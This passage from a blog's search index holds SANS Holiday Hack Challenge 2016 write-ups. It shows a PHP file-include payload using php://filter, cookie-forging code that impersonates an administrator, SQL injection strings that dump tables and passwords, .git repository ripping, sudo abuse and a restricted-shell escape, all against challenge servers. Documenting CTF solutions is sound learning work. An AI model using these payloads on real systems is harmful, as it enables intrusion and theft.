Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0    move-exception v1    invoke-virtual {v1}, Ljava/io/IOException;-&gt;printStackTrace()V    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0    move-exception v0    invoke-virtual {v0}, Ljava/lang/Exception;-&gt;getMessage()Ljava/lang/String;The logic to catch an exception (if it should happen) is there, let’s make sure it triggers. josh@MacBook-Pro ~/HolidayHack2016 $ vim ./smali/com/northpolewonderland/santagram/EditProfile.smali&lt;!--OUTPUT TRUNCATED--&gt;101     if-ne p1, v1, :cond_2102103     :try_start_0104     invoke-virtual {p0}, Lcom/northpolewonderland/santagram/EditProfile;-&gt;getApplicationContext()Landroid/content/Context;105106     move-result-object v1107108     invoke-virtual {v1}, Landroid/content/Context;-&gt;getContentResolver()Landroid/content/ContentResolver;109110     move-result-object v1111112     invoke-virtual {p3}, Landroid/content/Intent;-&gt;getData()Landroid/net/Uri;113114      move-result-object v2    # Replacing with move-exception v1115116     invoke-static {v1, v2}, Landroid/provider/MediaStore$Images$Media;-&gt;getBitmap(Landroid/content/ContentResolver;Landroid/net/Uri;)Landroid/graphics/Bitmap;117     :try_end_0118     .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0119120     move-result-object v0121122     move-object v1, v0123124     goto :goto_0125126     :catch_0127     move-exception v1128129     invoke-virtual {v1}, Ljava/io/IOException;-&gt;printStackTrace()V130131     :cond_2132     move-object v1, v0133134     goto :goto_0&lt;!--OUTPUT TRUNCATED--&gt;Changing line number 114 in the EditProfile.smali file to be move-exception v1 will cause the app to throw an exception after pressing the Edit Profile button.  From here,  take that POST request and send it to Repeater within Burp.  The POST request generated a crashdump file called crashdump-aDjJbG.php  When trying to fuzz the operation parameter, the error message displayed in the response discloses what the valid JSON keys are.  I already saw what the WriteCrashDump request looks like, let’s see what the ReadCrashDump responds with…  Getting a little further.  Now it wants a crashdump key set. Might as well specify a crashdump file to read also, since I have the name of the file generated earlier.  So the .php extension is not required.  To solve the final part of this challenge requires having a way to pull a PHP file from the server.  A recent SANS blog post titled Getting MOAR Value out of PHP Local File Include Vulnerabilities pointed me in the right direction. Specifically, I will be using a PHP wrapper to base64 encode the target file and then I can decode it easily.  Final payload {\"operation\":\"ReadCrashDump\",\"data\":{\"crashdump\":\"php://filter/convert.base64-encode/resource=crashdump-aDjJbG\"}} Saving the base64 encoded text to a file, then decoding it reveals the location of the audio file. josh@MacBook-Pro ~/HolidayHack2016/ $ cat exception_base64.txt| base64 -D &gt; exception_decoded.txtjosh@MacBook-Pro ~/HolidayHack2016/ $ cat exception_decoded.txt&lt;?php# Audio file from Discombobulator in webroot: discombobulated-audio-6-XyzE3N9YqKNH.mp3# Code from http://thisinterestsme.com/receiving-json-post-data-via-php/# Make sure that it is a POST request.if(strcasecmp($_SERVER['REQUEST_METHOD'], 'POST') != 0){    die(\"Request method must be POST\\n\");}# Make sure that the content type of the POST request has been set to application/json$contentType = isset($_SERVER[\"CONTENT_TYPE\"]) ? trim($_SERVER[\"CONTENT_TYPE\"]) : '';if(strcasecmp($contentType, 'application/json') != 0){    die(\"Content type must be: application/json\\n\");}# Grab the raw POST. Necessary for JSON in particular.$content = file_get_contents(\"php://input\");$obj = json_decode($content, true);\t# If json_decode failed, the JSON is invalid.if(!is_array($obj)){    die(\"POST contains invalid JSON!\\n\");}# Process the JSON.if ( ! isset( $obj['operation']) or (\t$obj['operation'] !== \"WriteCrashDump\" and\t$obj['operation'] !== \"ReadCrashDump\"))\t{\tdie(\"Fatal error! JSON key 'operation' must be set to WriteCrashDump or ReadCrashDump.\\n\");}if ( isset($obj['data'])) {\tif ($obj['operation'] === \"WriteCrashDump\") {\t\t# Write a new crash dump to disk\t\tprocessCrashDump($obj['data']);\t}\telseif ($obj['operation'] === \"ReadCrashDump\") {\t\t# Read a crash dump back from disk\t\treadCrashdump($obj['data']);\t}}else {\t# data key unset\tdie(\"Fatal error! JSON key 'data' must be set.\\n\");}function processCrashdump($crashdump) {\t$basepath = \"/var/www/html/docs/\";\t$outputfilename = tempnam($basepath, \"crashdump-\");\tunlink($outputfilename);\t$outputfilename = $outputfilename . \".php\";\t$basename = basename($outputfilename);\t$crashdump_encoded = \"&lt;?php print('\" . json_encode($crashdump, JSON_PRETTY_PRINT) . \"');\";\tfile_put_contents($outputfilename, $crashdump_encoded);\tprint &lt;&lt;&lt;END{\t\"success\" : true,\t\"folder\" : \"docs\",\t\"crashdump\" : \"$basename\"}END;}function readCrashdump($requestedCrashdump) {\t$basepath = \"/var/www/html/docs/\";\tchdir($basepath);\tif ( ! isset($requestedCrashdump['crashdump'])) {\t\tdie(\"Fatal error! JSON key 'crashdump' must be set.\\n\");\t}\tif ( substr(strrchr($requestedCrashdump['crashdump'], \".\"), 1) === \"php\" ) {\t\tdie(\"Fatal error! crashdump value duplicate '.php' extension detected.\\n\");\t}\telse {\t\trequire($requestedCrashdump['crashdump'] . '.php');\t}}?&gt;Audio file location: http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3   The Uncaught Exception Handler Server is complete! The Mobile Analytics Server (via credentialed login access) Using the credentials found during Part 1: A Most Curious Business Card in the APK file, guest and busyreindeer78 provided credentialed access to the login portal at https://analytics.northpolewonderland.com.  Once authenticated, simply click the MP3 link at the top to grab discombobulatedaudio2.mp3.   The Mobile Analytics Server (via credentialed login access) is complete! The Mobile Analytics Server (post authentication) Already knowing that I had the audio file for the authenticated guest account, there must be another area to attack on this server.  Another elf named “Minty Candycane” suggested using the nmap default scripts (-sC) flag to find extra files on web servers.  Let’s give it a shot. josh@MacBook-Pro ~/HolidayHack2016 $ nmap -sC -p- analytics.northpolewonderland.com -oA analytics.northpolewonderland.comStarting Nmap 7.31 ( https://nmap.org ) at 2016-12-24 13:32 ESTNmap scan report for analytics.northpolewonderland.com (104.198.252.157)Host is up (0.040s latency).rDNS record for 104.198.252.157: 157.252.198.104.bc.googleusercontent.comNot shown: 65533 filtered portsPORT    STATE SERVICE22/tcp  open  ssh| ssh-hostkey:|   1024 5d:5c:37:9c:67:c2:40:94:b0:0c:80:63:d4:ea:80:ae (DSA)|   2048 f2:25:e1:9f:ff:fd:e3:6e:94:c6:76:fb:71:01:e3:eb (RSA)|_  256 4c:04:e4:25:7f:a1:0b:8c:12:3c:58:32:0f:dc:51:bd (ECDSA)443/tcp open  https| http-git:|   104.198.252.157:443/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file 'description' to name the...|_    Last commit message: Finishing touches (style, css, etc)| http-title: Sprusage Usage Reporter!|_Requested resource was login.php| ssl-cert: Subject: commonName=analytics.northpolewonderland.com| Subject Alternative Name: DNS:analytics.northpolewonderland.com| Not valid before: 2016-12-07T17:35:00|_Not valid after:  2017-03-07T17:35:00|_ssl-date: ERROR: Script execution failed (use -d to debug)| tls-nextprotoneg:|_  http/1.1Nmap done: 1 IP address (1 host up) scanned in 125.65 secondsA Git repository found! To clone the repository locally, I used dvcs-ripper.  Just clone the dvcs-ripper repo, install any missing requirements and point rip-git.pl at the .git directory. Will also need to ignore SSL certification verification (with -s). josh@MacBook-Pro /opt/dvcs-ripper (master*) $ ./rip-git.pl -s -v -u 'https://analytics.northpolewonderland.com/.git/'[i] Downloading git files from https://analytics.northpolewonderland.com/.git/[i] Auto-detecting 404 as 200 with 3 requests[i] Getting correct 404 responses[i] Using session name: MtvKvTOc[d] found COMMIT_EDITMSG[d] found config[d] found description[d] found HEAD[d] found index[!] Not found for packed-refs: 404 Not Found[!] Not found for objects/info/alternates: 404 Not Found[!] Not found for info/grafts: 404 Not Found[d] found logs/HEAD[d] found objects/d6/3a7e0df35ad525fa40eceae67be5b27215ece8[d] found objects/10/57b70e7681f44aac2789e26a2b714327d8c203[d] found objects/bb/2646691fc9f6bf5f1a0ade746b28f8147ffa48[d] found objects/42/0f433fe33d14abac5c3a588c3e753d0d71d50d[d] found objects/5f/0c135e1479d865945577c0a70d0cf39e49cdc7[d] found objects/d9/636a3d648e617fcb92055dea63ac2469f67c84[d] found objects/f0/d28ed3cc39538a6c415789408ef3f24ded959c[d] found objects/02/e8d14ffa8910bfd5365ff36eb96bcd7efc4409[d] found objects/6a/b9fe6ec3de2e28b79108ff5110643e9ba32478[d] found objects/cf/5f27b161f53d62f97ad6ebc648701288a2ea89[d] found objects/26/89a45ab9c38d92675660b9113fc173a0ccf129[d] found objects/25/9d406f3f2345b50338d54a53efa36dd08f6f20[d] found objects/15/62064538562f077d388044e344e3c2d85450d7[d] found objects/07/78ac7de1d7ff8ae46ebabdee33a340ab9506f3[d] found objects/19/08b71d42bce15345cabb7a63f57b5c79b85d15[d] found objects/43/970092ea851cff05e44aba3e0a67eb351304f3[d] found objects/58/c900fd53fced0d588e00e23c26cb8465eed498[d] found objects/88/5ec6a4e870ce983aecde3a4f0e398b6a76615f[d] found objects/45/edadc1850c3894ab8850d1d77dca9a074a3a6a[d] found objects/85/a4207c178fa0f9c6b6bb77a6d42eac487159c0[d] found objects/62/547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31[d] found objects/93/5d79726e13ab65c3b5baa4d925de86059057d4[d] found objects/e4/6b41e391ee0e9f4afab7880982501ac1471fb4[d] found objects/10/6079e728c97ebea387042a2e076fab62952e1e[d] found objects/16/ae0cbe2630a87c0470b9a864bf048e813826db[d] found refs/heads/master[i] Running git fsck to check for missing itemsChecking object directories: 100% (256/256), done.Checking objects: 100% (139/139), done.[i] Got items with git fsck: 0, Items fetched: 0[!] No more items to fetch. That's it!Time to see what was pulled down… josh@MacBook-Pro /opt/dvcs-ripper (master*) $ ls -latotal 304drwxr-xr-x  33 josh  wheel   1122 Dec 29 13:52 .drwxr-xr-x@ 22 josh  wheel    748 Dec 26 09:31 ..drwxr-xr-x  14 josh  wheel    476 Dec 29 13:56 .git-rw-r--r--   1 josh  wheel    149 Dec 16 20:58 .gitignore-rw-r--r--   1 josh  wheel  18027 Dec 16 20:58 LICENSE-rw-r--r--   1 josh  wheel    310 Dec 29 13:52 README.mddrwxr-xr-x   2 josh  wheel     68 Dec 29 13:45 captured-rw-r--r--   1 josh  wheel    290 Dec 29 13:52 crypto.phpdrwxr-xr-x  11 josh  wheel    374 Dec 29 13:52 css-rw-r--r--   1 josh  wheel   2958 Dec 29 13:52 db.php-rw-r--r--   1 josh  wheel   2392 Dec 29 13:52 edit.phpdrwxr-xr-x   7 josh  wheel    238 Dec 29 13:52 fonts-rw-r--r--   1 josh  wheel     29 Dec 29 13:52 footer.php-rw-r--r--   1 josh  wheel   1191 Dec 29 13:52 getaudio.php-rw-r--r--   1 josh  wheel   2000 Dec 29 13:52 header.php-rw-r--r--   1 josh  wheel    819 Dec 29 13:52 index.phpdrwxr-xr-x   5 josh  wheel    170 Dec 29 13:52 js-rw-r--r--   1 josh  wheel   2913 Dec 29 13:52 login.php-rw-r--r--   1 josh  wheel    174 Dec 29 13:52 logout.php-rw-r--r--   1 josh  wheel    325 Dec 29 13:52 mp3.php-rw-r--r--   1 josh  wheel   7697 Dec 29 13:52 query.php-rw-r--r--   1 josh  wheel   2252 Dec 29 13:52 report.php-rwxr-xr-x   1 josh  wheel   6401 Dec 16 20:58 rip-bzr.pl-rwxr-xr-x   1 josh  wheel   4718 Dec 16 20:58 rip-cvs.pl-rwxr-xr-x   1 josh  wheel  15114 Dec 16 20:58 rip-git.pl-rwxr-xr-x   1 josh  wheel   6102 Dec 16 20:58 rip-hg.pl-rwxr-xr-x   1 josh  wheel   6157 Dec 16 20:58 rip-svn.pl-rw-r--r--   1 josh  wheel   5008 Dec 29 13:52 sprusage.sqldrwxr-xr-x   6 josh  wheel    204 Dec 29 13:52 test-rw-r--r--   1 josh  wheel    629 Dec 29 13:52 this_is_html.php-rw-r--r--   1 josh  wheel    739 Dec 29 13:52 this_is_json.php-rw-r--r--   1 josh  wheel    647 Dec 29 13:52 uuid.php-rw-r--r--   1 josh  wheel   1949 Dec 29 13:52 view.phpTaking a look at the header.php file revealed that there was also an administrator user and they were the only one allowed to view edit.php. josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat header.php&lt;!--OUTPUT TRUNCATED--&gt;        &lt;div class=\"navbar-collapse collapse\" id=\"navbar-main\"&gt;          &lt;ul class=\"nav navbar-nav\"&gt;            &lt;li&gt;&lt;a href=\"/query.php\"&gt;Query&lt;/a&gt;&lt;/li&gt;            &lt;li&gt;&lt;a href=\"/view.php\"&gt;View&lt;/a&gt;&lt;/li&gt;            &lt;?php              if (get_username() == 'guest') {                ?&gt;                  &lt;li&gt;&lt;a href=\"/&lt;?= mp3_web_path($db); ?&gt;\"&gt;MP3&lt;/a&gt;&lt;/li&gt;                &lt;?php              }              if (get_username() == 'administrator') {                ?&gt;                  &lt;li&gt;&lt;a href=\"/edit.php\"&gt;Edit&lt;/a&gt;&lt;/li&gt;                &lt;?php              }            ?&gt;          &lt;/ul&gt;&lt;!--OUTPUT TRUNCATED--&gt;The next question you may be asking yourself is, “How do I get the password for the administrator account?”  At this point, you can’t.  However, without a password, how else can you control another user’s authenticated session? The answer is at the bottom of login.php. josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat login.php&lt;!--OUTPUT TRUNCATED--&gt;EOF;  } else {    require_once('db.php');    check_user($db, $_POST['username'], $_POST['password']);    print \"Successfully logged in!\";    $auth = encrypt(json_encode([      'username' =&gt; $_POST['username'],      'date' =&gt; date(DateTime::ISO8601),    ]));    setcookie('AUTH', bin2hex($auth));    header('Location: index.php?msg=Successfully%20logged%20in!');  }?&gt;The code above describes how session cookies are generated.  I wondered if it was possible to host this application locally and modify this code to bypass the validation associated with check_user.   This is exactly what can be done because the .git repository had the .sql file. Time to switch back over to the Kali VM to host the MySQL database and use Apache to serve the PHP files.  The README.md included in the .git repo describes what is needed. root@gh0st1:/var/www/html# cat README.md# Installation* Install Linux/ApachePHP/MySQL (this should work fine under nginx and other systems)** Make sure you install `php-mysql` and `php-mcrypt`* Create a database using `sprusage.sql`** Create a MySQL user with full access to that database, and put its account in the variables on top of `db.php`Before importing the sprusage.sql file, a database has to be created for it first. root@gh0st1:/var/www/html# mysqlWelcome to the MySQL monitor.  Commands end with ; or \\g.Your MySQL connection id is 39140Server version: 5.6.30-1 (Debian)Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; CREATE DATABASE sprusage;Query OK, 1 row affected (0.04 sec)mysql&gt; EXIT;ByeNow to import the .sql file… One little note to add here, line 151 in sprusage.sql was actually missing a closing quote after localhost. Original:GRANT SELECT, INSERT, UPDATE ON `sprusage`.`app_usage_reports` TO 'sprusage'@'localhost; Modified:GRANT SELECT, INSERT, UPDATE ON `sprusage`.`app_usage_reports` TO 'sprusage'@'localhost'; With that update made, sprusage.sql will import successfully. root@gh0st1:/var/www/html# mysql -u root sprusage &lt; sprusage.sqlFinally, a user has to be created.  The username and password already in use in the db.php is sprusage with no password set.  That will have to be updated. mysql&gt; USE sprusage;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; CREATE USER 'sprusage'@'localhost' IDENTIFIED BY 'SANS2016';Query OK, 0 rows affected (0.00 sec)mysql&gt; GRANT ALL PRIVILEGES ON *.* TO 'sprusage'@'localhost';Query OK, 0 rows affected (0.04 sec)mysql&gt; FLUSH PRIVILEGES;Query OK, 0 rows affected (0.00 sec)mysql&gt; exit;ByeNow to update db.php setting the new password. &lt;?php  $dbHost = 'localhost';  $dbUsername = 'sprusage';  $dbPassword = 'SANS2016';  $dbName = 'sprusage';  $db = mysqli_connect($dbHost, $dbUsername, $dbPassword, $dbName);  if(!$db) {    reply(500, \"Couldn't connect to the database!\");    exit(1);  }&lt;!--OUTPUT TRUNCATED--&gt;All the files from the .git pull have been placed in /var/www/html/ so simply browsing to the Kali VM’s IP address on port 80 should show my local version of the analytics web application.  Great, it works! By taking the cookie generating code from login.php, I created a new PHP file called admin_cookie.php which looks like this: &lt;?php  # This should be the first require  require_once('this_is_html.php');  require_once('crypto.php');  require_once('db.php');$auth = encrypt(json_encode([      'username' =&gt; 'administrator',      'date' =&gt; date(DateTime::ISO8601),    ]));\tsetcookie('AUTH', bin2hex($auth));\techo '[*] Administrator Session Cookie Generated:  AUTH='; \techo bin2hex($auth);?&gt;Keeping the required files at the top, hardcoding the username to administrator then echoing out the generated session (AUTH) cookie.  This is what it looks like when you view it in the browser:  With this session cookie, I am essentially the administrator user, just have to inject it. To do that, go back to the real analytics site and use the Cookies Manager+ Firefox add-on.  Logging in with the guest account first. Finding the current session cookie.  Open Cookies Manager+ (1), search for the domain and press edit (2). Replacing the guest user session cookie with the generated administrator one. Then refresh the page. Boom goes the dynamite.  The edit.php page is now accessible. Now that I have administrator access it’s time to move on to exploit the final vulnerability on this host which is SQL injection.  SQLMapwon’t help with this one though.  It takes a few steps to get setup so let’s get going. First, create a query and check the “Save Query” box.  Doesn’t matter if it contains data or not, then press “Run Query.”  This query is now saved under 14ee7e28-9835-4fe6-a3f4-e4d4127d0d22  The generated link for this report is https://analytics.northpolewonderland.com/view.php?id=14ee7e28-9835-4fe6-a3f4-e4d4127d0d22  Before moving to the next step, let’s take a quick look at the query.php file pulled from the .git repo. josh@MacBook-Pro /opt/dvcs-ripper (master*) $ cat query.php&lt;!--OUTPUT TRUNCATED--&gt;      $value = mysqli_real_escape_string($db, $values[$i]);      $where[] = \"`$field` $modifier '$value'\";    }    $where[] = \"`date`='\" . mysqli_real_escape_string($db, $date) . \"' \";    $type = $_REQUEST['type'];    if($type !== 'launch' &amp;&amp; $type !== 'usage') {      reply(400, \"Type has to be either 'launch' or 'usage'!\");    }    $query = \"SELECT * \";    $query .= \"FROM `app_\" . $type . \"_reports` \";    $query .= \"WHERE \" . join(' AND ', $where) . \" \";    $query .= \"LIMIT 0, 100\";    if(isset($_REQUEST['save'])) {      $id = gen_uuid();      $name = \"report-$id\";      $description = \"Report generated @ \" . date('Y-m-d H:i:s');      $result = mysqli_query($db, \"INSERT INTO `reports`        (`id`, `name`, `description`, `query`)      VALUES        ('$id', '$name', '$description', '\" . mysqli_real_escape_string($db, $query) . \"')        \");      if(!$result) {        reply(500, \"Error saving report: \" . mysqli_error($db));        die();      }&lt;!--OUTPUT TRUNCATED--&gt;See the issue?  There is another parameter being passed called $query and it doesn’t have the same protections that the other fields do.  Plus, it’s being stored in $results. Remember that I have a query saved with an $id number already assigned.  Next, head over to the unlocked Edit page, enter the ID (14ee7e28-9835-4fe6-a3f4-e4d4127d0d22), the name and description fields can be blank. Finally, capture that request in a proxy…  Add &amp;query=SHOW TABLES; to the HTTP GET request and forward the request…  The query string has been saved successfully.  To view the results, head to the View page.  Enter the saved ID number one more time…  Now I can see the tables inside the database.  Time to dig deeper and enter different commands to read more data from the database.  Repeate the steps above with &amp;query=SELECT * FROM audio;  The audio file name is disclosed but how to download it?  Let’s think about this, it is possible to query and display text.  Why not try to convert the file to text? Base64 to the rescue! &amp;query=SELECT id, filename, TO_BASE64(mp3) FROM audio WHERE filename='discombobulatedaudio7.mp3';  Copy the wall of text (the base64 encoded MP3 file), save it to a text file, and decode it locally. josh@MacBook-Pro /$ cat base64_encoded_audio.txt | base64 -D &gt; discombobulatedaudio7.mp3 That’s it. One last fun thing is to see what the administrator’s password is in cleartext, because, why not? &amp;query=SELECT * FROM users;  What are the names of the audio files you discovered from each system above? There are a total of SEVEN audio files (one from the original APK in Question 4, plus one for each of the six items in the bullet list above.)             Number      Target      File Name                  1      The Mobile Analytics Server (via credentialed login access)      discombobulatedaudio2.mp3              2      The Mobile Analytics Server (post authentication)      discombobulatedaudio7.mp3              3      The Dungeon Game      discombobulatedaudio3.mp3              4      The Debug Server      debug-20161224235959-0.mp3              5      The Banner Ad Server      discombobulatedaudio5.mp3              6      The Uncaught Exception Handler Server      discombobulated-audio-6-XyzE3N9YqKNH.mp3              7      The SantaGram APK      discombobulatedaudio1.mp3      ","categories": ["SANS","Holday Hack","writeup"],
        "tags": [],
        "url": "https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt4-2016/",
        "teaser":"https://www.joshtomkiel.com/assets/images/sans-2016.png"},{
        "title": "Part 5: Discombobulated Audio",
        "excerpt":"Question 9: Who is the villain behind the nefarious plot? Question 10: Why had the villain abducted Santa? Audacity was used to combine all seven (7) of the MP3 files into one track and increased the tempo to 270% to hear the secret message.  If you’d like to hear it, this is my uncombobulatedaudio.mp3 version.  Or just read the message below:   “Father Christmas, Santa Claus. Or, as I’ve always known him, Jeff.”  - Source: IMDB Who is the villain behind the nefarious plot?Dr. Who  Dr. Who:   The question of the hour is this: Who nabbed Santa.The answer? Yes, I did. Why had the villain abducted Santa?To prevent the Star Wars Holiday Special from being released Dr. Who:   Next question: Why would anyone in his right mind kidnap Santa Claus? The answer: Do I look like I’m in my right mind? I’m a madman with a box. I have looked into the time vortex and I have seen a universe in which the Star Wars Holiday Special was NEVER released. In that universe, 1978 came and went as normal. No one had to endure the misery of watching that abominable blight. People were happy there. It’s a better life, I tell you, a better world than the scarred one we endure here. Give me a world like that. Just once. So I did what I had to do. I knew that Santa’s powerful North Pole Wonderland Magick could prevent the Star Wars Special from being released, if I could leverage that magick with my own abilities back in 1978. But Jeff refused to come with me, insisting on the mad idea that it is better to maintain the integrity of the universe’s timeline. So I had no choice – I had to kidnap him. It was sort of one of those days. Well. You know what I mean. Anyway… Since you interfered with my plan, we’ll have to live with the Star Wars Holiday Special in this universe… FOREVER. If we attempt to go back again, to cross our own timeline, we’ll cause a temporal paradox, a wound in time. We’ll never be rid of it now. The Star Wars Holiday Special will plague this world until time itself ends… All because you foiled my brilliant plan. Nice work.… ","categories": ["SANS","Holday Hack","writeup"],
        "tags": [],
        "url": "https://www.joshtomkiel.com/sans/holday%20hack/writeup/sans-holiday-hack-challenge-pt5-2016/",
        "teaser":"https://www.joshtomkiel.com/assets/images/sans-2016.png"},{
        "title": "Terminals",
        "excerpt":"There are a total of five (5) terminals that you can interact with while playing the Quest.  This year, the SANS Holiday Hack Challenge included in game “terminals.” After collecting the parts below to build a Cranberry Pi and talking with the elf, Holly Evergreen, you can interact with the terminals.             SD Card      Pi Board      HDMI Cord      Heatsink      Power Cord                                                To interact with a terminal, simply walk up to one of these  icons in the game.  You will be greeted with a command prompt on your own private Docker container. This feature was awesome!  Each terminal presented its own challenge. Without further ado, let me walk you through how I completed each one. Tcpdump Challenge  Challenge Objective: Get Both Parts of the Passphrase ********************************************************************************                                                                             **To open the door, find both parts of the passphrase inside the /out.pcap file* *                                                                             ********************************************************************************Let’s take a look at the default directory I was are placed in. ls -latotal 1136drwxr-xr-x  46 root  root     4096 Dec 31 19:55 .drwxr-xr-x  46 root  root     4096 Dec 31 19:55 ..-rwxr-xr-x   1 root  root        0 Dec 31 19:55 .dockerenvdrwxr-xr-x   2 root  root     4096 Dec  1 21:18 bindrwxr-xr-x   2 root  root     4096 Sep 12 04:09 bootdrwxr-xr-x   5 root  root      380 Dec 31 19:55 devdrwxr-xr-x  46 root  root     4096 Dec 31 19:55 etcdrwxr-xr-x   5 root  root     4096 Dec  7 20:22 homedrwxr-xr-x  10 root  root     4096 Dec  1 21:18 libdrwxr-xr-x   2 root  root     4096 Nov  4 18:29 lib64drwxr-xr-x   2 root  root     4096 Nov  4 18:28 mediadrwxr-xr-x   2 root  root     4096 Nov  4 18:28 mntdrwxr-xr-x   2 root  root     4096 Nov  4 18:28 opt-r--------   1 itchy itchy 1087929 Dec  2 15:05 out.pcapdr-xr-xr-x 370 root  root        0 Dec 31 19:55 procdrwx------   2 root  root     4096 Nov  4 18:28 rootdrwxr-xr-x   3 root  root     4096 Nov  4 18:28 rundrwxr-xr-x   2 root  root     4096 Nov  4 18:30 sbindrwxr-xr-x   2 root  root     4096 Nov  4 18:28 srvdr-xr-xr-x  13 root  root        0 Dec 14 14:13 sysdrwxrwxrwt   2 root  root     4096 Dec  7 20:22 tmpdrwxr-xr-x  15 root  root     4096 Dec  1 21:18 usrdrwxr-xr-x  17 root  root     4096 Dec  2 15:13 varThe file out.pcap is visible but it is owned by user “itchy”.  Our current user is “scratchy” and “scratchy” does not have rights to access it. The sudo command will come in handy here.  I don’t know the passwords for either account but let’s see what other options there are with sudo. sudo -hsudo - execute a command as another userusage: sudo -h | -K | -k | -Vusage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt]            [-u user] [VAR=value] [-i|-s] [&lt;command&gt;]usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt]            [-u user] file ...Options:  -A, --askpass               use a helper program for password prompting  -b, --background            run command in the background  -C, --close-from=num        close all file descriptors &gt;= num  -E, --preserve-env          preserve user environment when running command  -e, --edit                  edit files instead of running a command  -g, --group=group           run command as the specified group name or ID  -H, --set-home              set HOME variable to target user's home dir  -h, --help                  display help message and exit  -h, --host=host             run command on host (if supported by plugin)  -i, --login                 run login shell as the target user; a command may also be                              specified  -K, --remove-timestamp      remove timestamp file completely  -k, --reset-timestamp       invalidate timestamp file  -l, --list                  list user's privileges or check a specific command; use                              twice for longer format  -n, --non-interactive       non-interactive mode, no prompts are used  -P, --preserve-groups       preserve group vector instead of setting to target's  -p, --prompt=prompt         use the specified password prompt  -r, --role=role             create SELinux security context with specified role  -S, --stdin                 read password from standard input  -s, --shell                 run shell as the target user; a command may also be                              specified  -t, --type=type             create SELinux security context with specified type  -U, --other-user=user       in list mode, display privileges for user  -u, --user=user             run command (or edit file) as specified user name or ID  -V, --version               display version information and exit  -v, --validate              update user's timestamp without running a command  --                          stop processing command line argumentsLet’s see if I can list the privileges that our current user (scratchy) has. sudo -l -U scratchysudo: unable to resolve host fd1441e110fcMatching Defaults entries for scratchy on fd1441e110fc:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser scratchy may run the following commands on fd1441e110fc:    (itchy) NOPASSWD: /usr/sbin/tcpdump    (itchy) NOPASSWD: /usr/bin/stringsThe NOPASSWD setting is not great for security as it allows the command to be run without prompting for a password and it runs with the permissions of the owner.  In this case I can run a sudo command as “itchy” and have that account read the pcap with tcpdump and strings.  First, start by telling tcpdump to output in ASCII (-A) and read from a file (-r) then finally greping through that output to match words containing “part.” I chose to first look for “part” because the welcome banner said “find both parts of the passphrase inside the /out.pcap file.” sudo -u itchy tcpdump -A -r out.pcap | grep 'part'sudo: unable to resolve host fd1441e110fcreading from file out.pcap, link-type EN10MB (Ethernet)&lt; input type=\"hidden\" name=\"part1\" value=\"santasli\" /&gt;Nailed it.  Part 1 of the passphrase is santasli. Part 2 can be found using strings command.  However, just running strings will not show the answer.  Let’s take a look at what options strings has. strings -hUsage: strings [option(s)] [file(s)] Display printable strings in [file(s)] (stdin by default) The options are:  -a - --all                Scan the entire file, not just the data section [default]  -d --data                 Only scan the data sections in the file  -f --print-file-name      Print the name of the file before each string  -n --bytes=[number]       Locate &amp; print any NUL-terminated sequence of at  -&lt;number&gt;                   least [number] characters (default 4).  -t --radix={o,d,x}        Print the location of the string in base 8, 10 or 16  -w --include-all-whitespace Include all whitespace as valid string characters  -o                        An alias for --radix=o  -T --target=&lt;BFDNAME&gt;     Specify the binary file format  -e --encoding={s,S,b,l,B,L} Select character size and endianness:                            s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit  @&lt;file&gt;                   Read options from &lt;file&gt;  -h --help                 Display this information  -v -V --version           Print the program's version numberstrings: supported targets: elf64-x86-64 elf32-i386 elf32-x86-64 a.out-i386-linux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 plugin srec symbolsrec verilog tekhex binary ihexReport bugs to &lt; http://www.sourceware.org/bugzilla/ &gt;By specifying the encoding character size as 16-bit (-el) the cleartext passphase for Part 2 can be seen! sudo -u itchy strings -el out.pcapsudo: unable to resolve host fd1441e110fcpart2:ttlehelperComplete passphase:  santaslittlehelper The two user accounts were “itchy” and “scratchy”, it’s nice to see that they kept with The Simpsons theme…  OUTATIME Challenge  Challenge Objective:  Ride the Train I had the most fun with this challenge.  The terminal opens to a preconfigured menu with limited options. Train Management Console: AUTHORIZED USERS ONLY                ==== MAIN MENU ====STATUS:                         Train StatusBRAKEON:                        Set BrakesBRAKEOFF:                       Release BrakesSTART:                          Start TrainHELP:                           Open the help documentQUIT:                           Exit consolemenu:main&gt; Type HELP and press enter. Help Document for the Train**STATUS** option will show you the current state of the train (brakes, boiler, boiler temp, coal level)**BRAKEON** option enables the brakes.  Brakes should be enabled at every stop and while the train is not in use.**BRAKEOFF** option disables the brakes.  Brakes must be disabled before the **START** command will execute.**START** option will start the train if the brake is released and the user has the correct password.**HELP** brings you to this file.  If it's not here, this console cannot do it, unLESS you know something I don't.Just in case you wanted to know, here's a really good Cranberry pie recipe:Ingredients1 recipe pastry for a 9 inch double crust pie1 1/2 cups white sugar1/3 cup all-purpose flour1/4 teaspoon salt1/2 cup water 1 (12 ounce) package fresh cranberries1/4 cup lemon juice1 dash ground cinnamon2 teaspoons butter:Seeing the : at the bottom of the file immediately reminded me of a past SANS blog post about Escaping Restricted Linux Shells.  To escape this and access a shell prompt, simply put an exclamation mark (!) and press enter. Train Management Console: AUTHORIZED USERS ONLY                ==== MAIN MENU ====STATUS:                         Train StatusBRAKEON:                        Set 